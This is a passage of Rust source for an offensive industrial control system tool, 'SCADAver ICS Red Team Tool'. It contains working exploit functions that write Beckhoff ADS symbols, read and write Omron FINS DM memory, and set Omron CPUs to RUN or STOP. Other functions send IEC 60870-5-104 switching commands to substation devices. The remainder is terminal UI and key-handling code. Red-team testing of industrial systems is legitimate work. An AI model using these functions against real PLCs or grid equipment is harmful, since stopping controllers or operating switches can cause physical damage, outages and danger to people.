        Ok(false) => out("[!] Write sent — PLC did not acknowledge"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Beckhoff write symbol exploit ───────────────────────────────────────────

fn exploit_beckhoff_write_symbol(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    let (sym_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
    let value_bytes: Vec<u8> = hex_val.as_bytes().chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if value_bytes.is_empty() {
        out("[-] No valid hex bytes (format: SymbolName=hexvalue)");
        return;
    }
    out(&format!("[*] Discovering {ip} for ADS write..."));
    let Some(dev) = scan::discover_ip(ip, 3, true).ok()
        .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
    else {
        out("[-] No Beckhoff device responded");
        return;
    };
    out(&format!("[*] Writing symbol '{sym_name}' ({} bytes)...", value_bytes.len()));
    match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes) {
        Ok(true) => out("[+] Symbol written"),
        Ok(false) => out("[!] Write sent — ADS error code returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Omron FINS exploits ──────────────────────────────────────────────────────

fn exploit_omron_info(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Getting Omron device info from {ip}..."));
    match fins::get_device_info_tcp(ip) {
        Ok(dev) => {
            out(&format!("  Model:    {}", dev.model));
            out(&format!("  Version:  {}", dev.version));
            out(&format!("  Node:     0x{:02x}", dev.node_addr));
            out("[+] Device info retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_read_dm(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "10"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(10).min(100);
    out(&format!("[*] Reading DM{start}..DM{} from {ip}...", start + count - 1));
    match fins::read_dm_words(ip, 0, start, count) {
        Ok(vals) => {
            out(&format!("  {:<8}  {:<8}  {}", "Address", "Dec", "Hex"));
            out(&format!("  {:─<8}  {:─<8}  {:─<6}", "", "", ""));
            for (i, &v) in vals.iter().enumerate() {
                out(&format!("  DM{:<6}  {:<8}  {v:#06x}", start + i as u16, v));
            }
            out(&format!("[+] {} word(s)", vals.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_write_dm(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!("[*] Writing {} DM word(s) at DM{start} on {ip}...", values.len()));
    match fins::write_dm_words(ip, 0, start, &values) {
        Ok(()) => out("[+] DM words written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_cpu_status(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Reading CPU status from {ip}..."));
    match fins::get_cpu_state(ip, 0) {
        Ok(state) => out(&format!("[+] CPU State: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_cpu_run(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Setting Omron CPU to RUN (Monitor mode) on {ip}..."));
    match fins::set_cpu_mode(ip, 0, true) {
        Ok(true) => out("[+] CPU set to Monitor/Run mode"),
        Ok(false) => out("[!] Command sent — FINS error returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_cpu_stop(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
    match fins::set_cpu_mode(ip, 0, false) {
        Ok(true) => out("[+] CPU stopped"),
        Ok(false) => out("[!] Command sent — FINS error returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── IEC 60870-5-104 exploits ─────────────────────────────────────────────────

fn exploit_iec104_gi(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    out(&format!("[*] IEC 104 General Interrogation to {ip}..."));
    match client::connect(ip) {
        Ok(mut sess) => {
            out("[+] STARTDT confirmed");
            match client::general_interrogation(&mut sess) {
                Ok(objs) => {
                    for obj in &objs {
                        out(&format!("  IOA {:>6}: type=0x{:02x} data={:?}", obj.ioa, obj.type_id, obj.value));
                    }
                    out(&format!("[+] {} object(s) returned", objs.len()));
                }
                Err(e) => out(&format!("[-] GI failed: {e}")),
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_iec104_sc_on(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    let ioa = input.trim().parse::<u32>().unwrap_or(1);
    out(&format!("[*] IEC 104 Single Command ON to IOA {ioa} on {ip}..."));
    match client::connect(ip) {
        Ok(mut sess) => match client::single_command(&mut sess, ioa, true) {
            Ok(true) => out("[+] Single Command ON confirmed"),
            Ok(false) => out("[!] Command sent — negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_iec104_sc_off(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    let ioa = input.trim().parse::<u32>().unwrap_or(1);
    out(&format!("[*] IEC 104 Single Command OFF to IOA {ioa} on {ip}..."));
    match client::connect(ip) {
        Ok(mut sess) => match client::single_command(&mut sess, ioa, false) {
            Ok(true) => out("[+] Single Command OFF confirmed"),
            Ok(false) => out("[!] Command sent — negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_iec104_dc(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    let (ioa_s, state_s) = input.split_once(':').unwrap_or((input, "2"));
    let ioa = ioa_s.trim().parse::<u32>().unwrap_or(1);
    let state = state_s.trim().parse::<u8>().unwrap_or(2).clamp(1, 3);
    let state_name = match state { 1 => "OFF", 2 => "ON", _ => "INDETERMINATE" };
    out(&format!("[*] IEC 104 Double Command IOA {ioa} state={state_name} on {ip}..."));
    match client::connect(ip) {
        Ok(mut sess) => match client::double_command(&mut sess, ioa, state) {
            Ok(true) => out("[+] Double Command confirmed"),
            Ok(false) => out("[!] Command sent — negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Rendering ───────────────────────────────────────────────────────────────

fn draw(frame: &mut Frame, app: &mut App) {
    let size = frame.area();
    let root = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(3), Constraint::Min(0), Constraint::Length(5)])
        .split(size);

    draw_header(frame, root[0], app);
    if app.mode == Mode::OutputZoom {
        draw_output_zoom(frame, root[1], app);
    } else {
        draw_main(frame, root[1], app);
    }
    draw_log_strip(frame, root[2], app);

    match app.mode {
        Mode::ScanMenu => draw_scan_menu(frame, size, app),
        Mode::Help => draw_help(frame, size),
        Mode::ExploitInput => draw_exploit_input_popup(frame, size, app),
        _ => {}
    }

    if app.quit_confirm {
        draw_quit_confirm(frame, size);
    }
}

fn draw_header(frame: &mut Frame, area: Rect, app: &App) {
    let scan_tag = if app.active_jobs > 0 {
        format!(" \u{25cf} {} RUNNING", app.active_jobs)
    } else {
        String::new()
    };
    let title = format!(" SCADAver ICS Red Team Tool v1.0{scan_tag} ");
    let keys = match app.mode {
        Mode::Normal =>
            " [A] Add IP  [S] Scan  [E] Exploit  [R] Rescan  [D] Delete  [/] Search  [O] Zoom  [C] Clear output  [?] Help  [Q] Quit",
        Mode::IpInput => " Enter IP address \u{2014} [ESC] cancel",
        Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [O] Zoom output  [PgUp/PgDn] Scroll  [ESC] back",
        Mode::Search => " Type to filter \u{2014} [ESC] clear  [ENTER] confirm",
        Mode::ExploitInput => " Enter parameter \u{2014} [ENTER] run  [ESC] cancel",
        Mode::OutputZoom => " [J/K/PgUp/PgDn] Scroll  [G] Bottom  [g] Top  [C] Clear  [O/ESC] Close",
        _ => " [ESC / ?] back",
    };

    let text = vec![
        Line::from(Span::styled(title, Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))),
        Line::from(Span::styled(keys, Style::default().fg(Color::DarkGray))),
    ];
    let para = Paragraph::new(text).block(
        Block::default().borders(Borders::ALL).border_style(Style::default().fg(Color::Cyan)),
    );
    frame.render_widget(para, area);
}

fn draw_main(frame: &mut Frame, area: Rect, app: &mut App) {
    let chunks = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(28), Constraint::Percentage(72)])
        .split(area);
    draw_device_list(frame, chunks[0], app);
    draw_right_panel(frame, chunks[1], app);
}

fn vendor_color(vendor: &str) -> Color {
    match vendor.to_lowercase().as_str() {
        "beckhoff" => Color::Cyan,
        "siemens" => Color::Blue,
        "rockwell" | "enip" => Color::Yellow,
        "schneider" | "modicon" => Color::Green,
        "mitsubishi" => Color::Magenta,
        "phoenix" => Color::Red,
        "ewon" => Color::White,
        "omron" => Color::LightYellow,
        "iec104" => Color::LightCyan,
        _ => Color::Gray,
    }
}

fn draw_device_list(frame: &mut Frame, area: Rect, app: &mut App) {
    let filter_label = if app.filter.is_empty() {
        String::new()
    } else {
        format!(" [/{}]", app.filter)
    };
    let title = format!(" Devices ({}){filter_label} ", app.filtered_indices.len());

    let items: Vec<ListItem> = app
        .filtered_indices
        .iter()
        .map(|&idx| {
            let dev = &app.devices[idx];
            let c = vendor_color(&dev.vendor);
            let mut name = dev.vendor.clone();
            name.get_mut(0..1).map(|s| { s.make_ascii_uppercase(); s });
            ListItem::new(vec![
                Line::from(Span::styled(format!(" {} ", dev.ip), Style::default().fg(c).add_modifier(Modifier::BOLD))),
                Line::from(Span::styled(format!("  {name}"), Style::default().fg(Color::DarkGray))),
                Line::from(Span::styled(format!("  {}", dev.last_seen_str()), Style::default().fg(Color::DarkGray))),
            ])
        })
        .collect();

    let list = List::new(items)
        .block(Block::default().title(title.as_str()).borders(Borders::ALL).border_style(Style::default().fg(Color::Cyan)))
        .highlight_style(Style::default().bg(Color::DarkGray).add_modifier(Modifier::BOLD))
        .highlight_symbol("\u{25b6} ");

    frame.render_stateful_widget(list, area, &mut app.list_state);
}

fn draw_right_panel(frame: &mut Frame, area: Rect, app: &App) {
    match app.mode {
        Mode::ExploitMenu | Mode::ExploitInput => draw_exploit_menu(frame, area, app),
        Mode::IpInput => draw_ip_input(frame, area, app),
        Mode::Search => draw_search_panel(frame, area, app),
        _ => draw_detail_panel(frame, area, app),
    }
}

fn draw_detail_panel(frame: &mut Frame, area: Rect, app: &App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(40), Constraint::Percentage(60)])
        .split(area);

    let info_text = match app.selected_device() {
        Some(dev) => {
            let mut lines = vec![
                Line::from(vec![
                    Span::styled(" IP:       ", Style::default().fg(Color::DarkGray)),
                    Span::styled(&dev.ip, Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD)),
                ]),
                Line::from(vec![
                    Span::styled(" Vendor:   ", Style::default().fg(Color::DarkGray)),
                    Span::styled(dev.vendor.to_uppercase(), Style::default().fg(vendor_color(&dev.vendor))),
                ]),
                Line::from(vec![
                    Span::styled(" Last seen:", Style::default().fg(Color::DarkGray)),
                    Span::styled(format!(" {}", dev.last_seen_str()), Style::default().fg(Color::Gray)),
                ]),
                Line::from(""),
            ];
            if let Value::Object(map) = &dev.fields {
                for (k, v) in map {
                    let val_str = match v {
                        Value::String(s) if !s.is_empty() => s.clone(),
                        Value::Null | Value::String(_) => continue,
                        other => other.to_string(),
                    };
                    lines.push(Line::from(vec![
                        Span::styled(format!(" {k}:"), Style::default().fg(Color::DarkGray)),
                        Span::styled(format!(" {val_str}"), Style::default().fg(Color::White)),
                    ]));
                }
            }
            lines.push(Line::from(""));
            lines.push(Line::from(Span::styled(
                " [E] Exploit menu  [R] Rescan  [D] Delete",
                Style::default().fg(Color::Yellow),
            )));
            lines
        }
        None => vec![
            Line::from(""),
            Line::from(Span::styled(" No device selected.", Style::default().fg(Color::DarkGray))),
            Line::from(""),
            Line::from(Span::styled(" [A] Add / probe IP   [S] Broadcast scan", Style::default().fg(Color::DarkGray))),
        ],
    };

    frame.render_widget(
        Paragraph::new(info_text)
            .block(Block::default().title(" Device Info ").borders(Borders::ALL).border_style(Style::default().fg(Color::Cyan)))
            .wrap(Wrap { trim: false }),
        chunks[0],
    );

    frame.render_widget(output_widget(&app.output_lines, chunks[1].height, app.output_scroll), chunks[1]);
}

fn draw_exploit_menu(frame: &mut Frame, area: Rect, app: &App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(45), Constraint::Percentage(55)])
        .split(area);

    let vendor = app.selected_vendor().unwrap_or_default();
    let title = format!(" Exploits \u{2014} {} ", vendor.to_uppercase());

    let items: Vec<ListItem> = app
        .exploit_defs
        .iter()
        .map(|e| {
            let c = if e.label.starts_with('\u{2190}') {
                Color::DarkGray
            } else if e.needs_input {
                Color::Yellow
            } else {
                Color::White
            };
            ListItem::new(Line::from(Span::styled(format!(" {} ", e.label), Style::default().fg(c))))
        })
        .collect();

    let mut state = ListState::default();
    state.select(Some(app.exploit_sel));

    let list = List::new(items)
        .block(Block::default().title(title.as_str()).borders(Borders::ALL).border_style(Style::default().fg(Color::Yellow)))
        .highlight_style(Style::default().bg(Color::DarkGray).add_modifier(Modifier::BOLD))
        .highlight_symbol("\u{25b6} ");

    frame.render_stateful_widget(list, chunks[0], &mut state);
    frame.render_widget(output_widget(&app.output_lines, chunks[1].height, app.output_scroll), chunks[1]);
}

fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
    let visible = area.height.saturating_sub(2) as usize;
    let total = app.output_lines.len();
    let end = total.saturating_sub(app.output_scroll).max(visible.min(total));
    let start = end.saturating_sub(visible);

    let text: Vec<Line> = app.output_lines[start..end]
        .iter()
        .map(|l| {
            let c = if l.starts_with("══") { Color::Cyan }
                    else if l.trim_start().starts_with("──") { Color::DarkGray }
                    else if l.starts_with("[+]") { Color::Green }
                    else if l.starts_with("[-]") { Color::Red }
                    else if l.starts_with("[!]") { Color::Yellow }
                    else { Color::White };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();

    let title = if total == 0 {
        " Output (empty) ".to_string()
    } else if app.output_scroll == 0 {
        format!(" Output \u{2014} {total} lines \u{2014} [O/ESC] close ")
    } else {
        format!(" Output \u{2014} {}\u{2013}{}/{} \u{2014} [O/ESC] close ", start + 1, end, total)
    };

    frame.render_widget(
        Paragraph::new(text)
            .block(Block::default().title(title).borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Cyan)))
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn output_widget<'a>(lines: &'a [String], height: u16, scroll: usize) -> Paragraph<'a> {
    let visible = height.saturating_sub(2) as usize;
    let total = lines.len();

    // scroll=0 → auto-scroll to bottom; scroll=N → N lines from the bottom upward
    let end = total.saturating_sub(scroll).max(visible.min(total));
    let start = end.saturating_sub(visible);

    let text: Vec<Line> = lines[start..end]
        .iter()
        .map(|l| {
            let c = if l.starts_with("══") { Color::Cyan }
                    else if l.trim_start().starts_with("──") { Color::DarkGray }
                    else if l.starts_with("[+]") { Color::Green }
                    else if l.starts_with("[-]") { Color::Red }
                    else if l.starts_with("[!]") { Color::Yellow }
                    else { Color::White };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();

    let title = if scroll == 0 || total <= visible {
        if total > visible {
            format!(" Output [{total} lines \u{2191}PgUp] ")
        } else {
            " Output ".to_string()
        }
    } else {
        format!(" Output [{}\u{2013}{}/{} \u{2191}\u{2193}PgUp/PgDn] ", start + 1, end, total)
    };

    Paragraph::new(text)
        .block(Block::default().title(title).borders(Borders::ALL).border_style(Style::default().fg(Color::DarkGray)))
        .wrap(Wrap { trim: false })
}

fn draw_ip_input(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(" Enter IP address to probe:", Style::default().fg(Color::DarkGray))),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Runs auto-detection across all vendors. ENTER to start, ESC to cancel.",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(Block::default().title(" Add / Probe IP ").borders(Borders::ALL).border_style(Style::default().fg(Color::Cyan)))
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn draw_search_panel(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(" Filter devices by IP or vendor:", Style::default().fg(Color::DarkGray))),
        Line::from(""),
        Line::from(Span::styled(
            format!("  / {}\u{2588}", app.input_buf),
            Style::default().fg(Color::Green).add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(Block::default().title(" Search ").borders(Borders::ALL).border_style(Style::default().fg(Color::Green))),
        area,
    );
}

fn draw_log_strip(frame: &mut Frame, area: Rect, app: &App) {
    let visible = area.height.saturating_sub(2) as usize;
    let text: Vec<Line> = app
        .logs
        .iter()
        .rev()
        .take(visible)
        .rev()
        .map(|l| {
            let c = if l.starts_with("[+]") { Color::Green }
                    else if l.starts_with("[-]") { Color::Red }
                    else if l.starts_with("[!]") { Color::Yellow }
                    else { Color::DarkGray };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();
    frame.render_widget(
        Paragraph::new(text)
            .block(Block::default().title(" Activity Log ").borders(Borders::ALL).border_style(Style::default().fg(Color::DarkGray))),
        area,
    );
}

fn draw_scan_menu(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(52, 50, area);
    frame.render_widget(Clear, popup);

    let items: Vec<ListItem> = SCAN_ITEMS
        .iter()
        .map(|s| {
            let c = if s.starts_with('\u{2190}') { Color::DarkGray } else { Color::White };
            ListItem::new(Line::from(Span::styled(format!("  {s}  "), Style::default().fg(c))))
        })
        .collect();
    let mut state = ListState::default();
    state.select(Some(app.scan_menu_sel));

    let list = List::new(items)
        .block(Block::default().title(" Broadcast Scan ").borders(Borders::ALL).border_style(Style::default().fg(Color::Cyan)))
        .highlight_style(Style::default().bg(Color::DarkGray).add_modifier(Modifier::BOLD))
        .highlight_symbol("\u{25b6} ");
    frame.render_stateful_widget(list, popup, &mut state);
}

fn draw_exploit_input_popup(frame: &mut Frame, area: Rect, app: &App) {
    let hint = app.exploit_defs.get(app.exploit_sel).map_or("parameter", |e| e.input_hint);
    let popup = centered_rect(60, 25, area);
    frame.render_widget(Clear, popup);

    let text = vec![
        Line::from(""),
        Line::from(Span::styled(format!(" Enter {hint}:"), Style::default().fg(Color::DarkGray))),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(Block::default().title(" Exploit Parameter ").borders(Borders::ALL).border_style(Style::default().fg(Color::Yellow)))
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_help(frame: &mut Frame, area: Rect) {
    let popup = centered_rect(58, 75, area);
    frame.render_widget(Clear, popup);

    let s = Style::default();
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(" Navigation", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
        Line::from(Span::styled("  J / \u{2193}    Next device", s.fg(Color::White))),
        Line::from(Span::styled("  K / \u{2191}    Prev device", s.fg(Color::White))),
        Line::from(Span::styled("  /        Search / filter", s.fg(Color::White))),
        Line::from(""),
        Line::from(Span::styled(" Device Actions", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
        Line::from(Span::styled("  A        Add / probe single IP", s.fg(Color::White))),
        Line::from(Span::styled("  S        Broadcast scan (all or by vendor)", s.fg(Color::White))),
        Line::from(Span::styled("  E        Open exploit menu for selected device", s.fg(Color::White))),
        Line::from(Span::styled("  R        Rescan selected device", s.fg(Color::White))),
        Line::from(Span::styled("  D        Delete selected device from database", s.fg(Color::White))),
        Line::from(""),
        Line::from(Span::styled(" Exploit Menu", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
        Line::from(Span::styled("  J/K      Navigate exploit list", s.fg(Color::White))),
        Line::from(Span::styled("  ENTER    Run selected exploit", s.fg(Color::White))),
        Line::from(Span::styled("  Yellow   Exploit requires input parameter", s.fg(Color::Yellow))),
        Line::from(""),
        Line::from(Span::styled(" Output", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
        Line::from(Span::styled("  O        Zoom output panel fullscreen", s.fg(Color::White))),
        Line::from(Span::styled("  C        Clear output panel", s.fg(Color::White))),
        Line::from(Span::styled("  PgUp/Dn  Scroll output (any mode)", s.fg(Color::White))),
        Line::from(Span::styled("  g / G    Top / bottom (in zoom)", s.fg(Color::White))),
        Line::from(Span::styled("  Cyan ══  Job start/end separator", s.fg(Color::Cyan))),
        Line::from(""),
        Line::from(Span::styled(" Global", s.fg(Color::Cyan).add_modifier(Modifier::BOLD))),
        Line::from(Span::styled("  ?        Toggle this help", s.fg(Color::White))),
        Line::from(Span::styled("  ESC      Back / cancel / clear filter", s.fg(Color::White))),
        Line::from(Span::styled("  Q        Quit (confirm prompt)", s.fg(Color::White))),
        Line::from(Span::styled("  C-c      Force quit", s.fg(Color::White))),
        Line::from(""),
        Line::from(Span::styled(
            "  DB: ~/.config/scadaver/devices.db",
            s.fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default().title(" Help \u{2014} SCADAver ").borders(Borders::ALL).border_style(Style::default().fg(Color::Cyan)),
        ).wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_quit_confirm(frame: &mut Frame, area: Rect) {
    let popup = centered_rect(38, 22, area);
    frame.render_widget(Clear, popup);
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            "  Quit SCADAver?",
            Style::default().fg(Color::White).add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            "  [Q] Confirm quit",
            Style::default().fg(Color::Red),
        )),
        Line::from(Span::styled(
            "  [ESC] Cancel",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Confirm Exit ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Red)),
        ),
        popup,
    );
}

fn centered_rect(pct_x: u16, pct_y: u16, area: Rect) -> Rect {
    let margin_v = (100 - pct_y) / 2;
    let margin_h = (100 - pct_x) / 2;
    let vert = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(margin_v), Constraint::Percentage(pct_y), Constraint::Percentage(margin_v)])
        .split(area);
    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(margin_h), Constraint::Percentage(pct_x), Constraint::Percentage(margin_h)])
        .split(vert[1])[1]
}

// ─── Event handlers ──────────────────────────────────────────────────────────

/// Returns true if the app should quit.
fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
    let mode = app.mode.clone();
    match mode {
        Mode::Normal => handle_normal(app, db, code, mods),
        Mode::IpInput => { handle_ip_input(app, code); false }
        Mode::ScanMenu => { handle_scan_menu(app, code); false }
        Mode::ExploitMenu => { handle_exploit_menu(app, code); false }
        Mode::ExploitInput => { handle_exploit_input(app, code); false }
        Mode::Search => { handle_search(app, code); false }
        Mode::Help => { app.mode = Mode::Normal; false }
        Mode::OutputZoom => { handle_output_zoom(app, code, mods); false }
    }
}

fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
    match code {
        KeyCode::Esc | KeyCode::Char('o') | KeyCode::Char('O') => app.exit_zoom(),
        KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => app.exit_zoom(),
        KeyCode::Char('c') | KeyCode::Char('C') => {
            app.output_lines.clear();
            app.output_scroll = 0;
        }
        KeyCode::Char('j') | KeyCode::Down => app.scroll_output_down(1),
        KeyCode::Char('k') | KeyCode::Up => app.scroll_output_up(1),
        KeyCode::PageDown => app.scroll_output_down(20),
        KeyCode::PageUp => app.scroll_output_up(20),
        // g = go to top (oldest), G = go to bottom (newest / auto-scroll)
        KeyCode::Char('G') => app.output_scroll = 0,
        KeyCode::Char('g') => {
            app.output_scroll = app.output_lines.len().saturating_sub(1);
        }
        KeyCode::Home => {
            app.output_scroll = app.output_lines.len().saturating_sub(1);
        }
        KeyCode::End => app.output_scroll = 0,
        _ => {}
    }
}

fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
    match code {
        KeyCode::Char('q') | KeyCode::Char('Q') => {
            if app.quit_confirm {
                return true;
            }
            app.quit_confirm = true;
            return false;
        }
        KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => return true,
        KeyCode::Esc if app.quit_confirm => { app.quit_confirm = false; }
        KeyCode::PageUp => { app.scroll_output_up(10); }
        KeyCode::PageDown => { app.scroll_output_down(10); }
        KeyCode::Char('o') | KeyCode::Char('O') => app.enter_zoom(),
        KeyCode::Char('j') | KeyCode::Down => app.select_next(),
        KeyCode::Char('k') | KeyCode::Up => app.select_prev(),
        KeyCode::Char('a') | KeyCode::Char('A') => {
            app.input_buf.clear();
            app.output_lines.clear();
            app.output_scroll = 0;
            app.mode = Mode::IpInput;
        }
        KeyCode::Char('s') | KeyCode::Char('S') => {
            app.scan_menu_sel = 0;
            app.mode = Mode::ScanMenu;
        }
        KeyCode::Char('e') | KeyCode::Char('E') => {
            app.open_exploit_menu();
            maybe_auto_load_tags(app);
        }
        KeyCode::Char('r') | KeyCode::Char('R') => {
            if let Some(ip) = app.selected_device_ip() {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                app.output_lines.push(format!("══ Rescan @ {ip} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Rescanning {ip}..."));
                let tx = app.scan_tx.clone();
                spawn_ip_scan(ip, tx);
            }
        }
        KeyCode::Char('c') | KeyCode::Char('C')
            if !mods.contains(KeyModifiers::CONTROL) => {
            app.output_lines.clear();
            app.output_scroll = 0;
        }
        KeyCode::Char('d') | KeyCode::Char('D') => {
            if let Some(dev) = app.selected_device() {
                let (id, ip) = (dev.id, dev.ip.clone());
                if db.delete_device(id).is_ok() {
                    app.log(format!("[!] Deleted {ip}"));
                    app.reload(db);
                }
            }
        }
        KeyCode::Char('/') => {
            app.input_buf.clear();
            app.mode = Mode::Search;
        }
        KeyCode::Char('?') => app.mode = Mode::Help,
        KeyCode::Esc => {
            if app.quit_confirm {
                app.quit_confirm = false;
            } else {
                app.filter.clear();
                app.rebuild_filtered();
            }
        }
        _ => {}
    }
    false
}

fn handle_ip_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => { app.mode = Mode::Normal; app.input_buf.clear(); }
        KeyCode::Enter => {
            let ip = app.input_buf.trim().to_string();
            if ip.parse::<std::net::Ipv4Addr>().is_ok() {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                app.output_lines.push(format!("══ Probe @ {ip} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Probing {ip}..."));
                let tx = app.scan_tx.clone();
                spawn_ip_scan(ip, tx);
                app.mode = Mode::Normal;
                app.input_buf.clear();
            } else if !ip.is_empty() {
                app.log(format!("[!] Invalid IPv4 address: {ip}"));
            }
        }
        KeyCode::Backspace => { app.input_buf.pop(); }
        KeyCode::Char(c) if app.input_buf.len() < 15 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_scan_menu(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::Normal,
        KeyCode::Char('j') | KeyCode::Down => {
            app.scan_menu_sel = (app.scan_menu_sel + 1).min(SCAN_ITEMS.len() - 1);
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.scan_menu_sel = app.scan_menu_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let sel = app.scan_menu_sel;
            if sel == SCAN_BACK_IDX {
                app.mode = Mode::Normal;
            } else {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                let label_str = SCAN_ITEMS[sel];
                app.output_lines.push(format!("══ Scan: {label_str} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Starting broadcast scan: {label_str}..."));
                let tx = app.scan_tx.clone();
                spawn_broadcast_scan(sel, tx);
                app.mode = Mode::Normal;
            }
        }
        _ => {}
    }
}

fn handle_exploit_menu(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::Normal,
        KeyCode::PageUp => { app.scroll_output_up(10); }
        KeyCode::PageDown => { app.scroll_output_down(10); }
        KeyCode::Char('o') | KeyCode::Char('O') => app.enter_zoom(),
        KeyCode::Char('j') | KeyCode::Down => {
            app.exploit_sel = (app.exploit_sel + 1).min(app.exploit_defs.len().saturating_sub(1));
        }
        KeyCode::Char('k') | KeyCode::Up => {
